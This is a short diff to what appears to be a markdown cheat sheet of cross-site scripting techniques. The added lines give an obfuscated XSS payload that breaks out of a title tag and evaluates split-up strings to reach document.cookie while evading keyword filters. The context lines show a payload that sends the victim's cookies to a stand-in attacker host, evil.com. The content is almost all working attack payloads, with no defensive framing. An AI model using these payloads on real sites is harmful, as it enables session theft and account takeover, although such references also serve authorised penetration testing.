@@ -22,6 +22,10 @@
   ```
 
 #### **2. XSS Techniques**
+- **Bypass Cookies blocked**
+  ```bash
+  </title><svg/onload="az3m=%27alert(document.co%27; az3m1=%27okie)%27;Az3mEasilyBypassXSS=az3m.concat(az3m1);eval(Az3mEasilyBypassXSS);">
+  ```
 - **HTTP Only Bypass**:
   ```bash
   location.href = "evil.com?c='escape(document.cookie)'"
